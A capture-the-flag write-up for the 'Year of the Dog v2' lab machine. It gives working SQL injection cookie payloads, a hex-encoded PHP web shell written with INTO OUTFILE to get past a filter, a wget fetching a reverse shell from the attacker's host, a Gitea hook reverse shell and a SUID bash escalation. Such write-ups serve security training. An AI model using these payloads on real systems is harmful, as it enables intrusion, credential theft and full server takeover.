# Year of the Dog v2

## NMAP

```
Nmap scan report for 10.10.248.244
Host is up (0.16s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e4:c9:dd:9b:db:95:9e:fd:19:a9:a6:0d:4c:43:9f:fa (RSA)
|   256 c3:fc:10:d8:78:47:7e:fb:89:cf:81:8b:6e:f1:0a:fd (ECDSA)
|_  256 27:68:ff:ef:c0:68:e2:49:75:59:34:f2:bd:f0:c9:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Canis Queue
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/14%OT=22%CT=1%CU=42193%PV=Y%DS=5%DC=T%G=Y%TM=6117EEC
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1
OS:1NW7%O6=M506ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   38.51 ms  10.17.0.1
2   ... 4
5   161.79 ms 10.10.248.244

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 502.75 seconds
```


## Getting Reverse shell

1. While visiting the website I didn't find anything interesting.
2. Tried feroxbuster but didn't find anything interestig.
3. Only thing interesting was config.php found by nkito but it was hidden.
4. The next thing interseting was cookie `id` just like suspected there is sql injection vulnerability.
`Cookie: id=' union select 1,2 -- -` and there was no error.
5. Enumerating databases: `Cookie: id='union select 1,group_concat('\n',schema_name)from information_schema.schemata-- -` and returned webapp.
6. Enumerating tables: `Cookie: id='union select 1,group_concat('\n',table_name)from information_schema.tables where table_schema='webapp'-- -`
7. Enumerating columns from table queue: `Cookie: id='union select 1,group_concat('\n',userID,':',queueNum) from webapp.queue-- -`
8. Most of the time LOAD_FILE and INTO OUTFILE will be disabled in this case it was not.
9. We could see file using LOAD_FILE `Cookie: id='union select 1,LOAD_FILE('/etc/passwd') from webapp.queue-- -`
And we are able to see config.php with `Cookie: id='union select 1,LOAD_FILE('/var/www/html/config.php') from webapp.queue-- -` and it has database admin username and password.
10. We can also write: `Cookie: id='union select 1,'Hello from SQLI' INTO OUTFILE '/var/www/html/test.php' from webapp.queue-- -` and we can check whether the file is written by `curl http://10.10.243.0/test.php` and the file is there.
11. Lets try to to RCE. `Cookie: id='union select 1,'<?php system($_GET['cmd']) ?> INTO OUTFILE '/var/www/html/shell.php' from webapp.queue-- -` but it throws error: "RCE Attempt detected".
12. Lets try to convert to hex and upload. `Cookie: id='union select 1,unhex('3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E') INTO OUTFILE '/var/www/html/shell.php' from webapp.queue-- -` and it worked.
13. Go to http://10.10.243.0/shell.php?cmd=id on the browser and you can verify it works.
14. To upload php_rshell we can just user wget, `http://10.10.243.0/shell.php?cmd=wget http://[our_ip]/php_rshell.php` and run the shell from browser and capture the using netcat.
15. We have reverse shell.

## Escalate to user dylan.
1. When inspecting folder /home/dylan we find a file work_analysis.
2. We can find username and password of dylan in plain text. `cat work_anaylys | grep -Ri "dylan" 2>/dev/null`.
3. We can login as dylan and even ssh.

## Escalate to root user.

1. There are ports open port listening `ss -ltn`. Whn tested one of them `curl 127.0.0.1:3000` its giving back a web page.
2. Lets open it our browser using ssh port forwarding. `ssh -N -L 3000:127.0.0.1:3000 dylan@10.10.60.146` 
3. Open http://127.0.0.1:3000 and we found it is using gitea.
4. Tried to login as dylan but there is two factor authentication.
5. The "Gitea Version: 1.13.0+dev-542-gbc11caff9" had RCE vulnerability. If username and password is there we can edit hook "pre-recieve" to execute commands while each push command.
6. We have Gitea folder and user dylan has full permission.
7. Create a user in Gitea through browser and create repository.
8. Go to the `/gitea/git/repositories/test/test.git/hooks` and edit `pre-receive` file and add reverse shell commands and start nc listener on kali.
9. Create a file and when pushing we got a reverse shell.
10. While checking we have full access `sudo -l`
11. Exit out of the shell and copy `/bin/bash` to `/gitea/git/repositories/test2/test2.git`.
12. Again push any file to git to get reverse shell.
13. Right now we are able see bash file there.
14. Escalate privilege by `sudo ./bash`.
15. `chown root:root bash`
16. `chmod u+s bash` to set suid bit.
17. Exit out of the shell.
18. `./bash -p` and we are root.

***
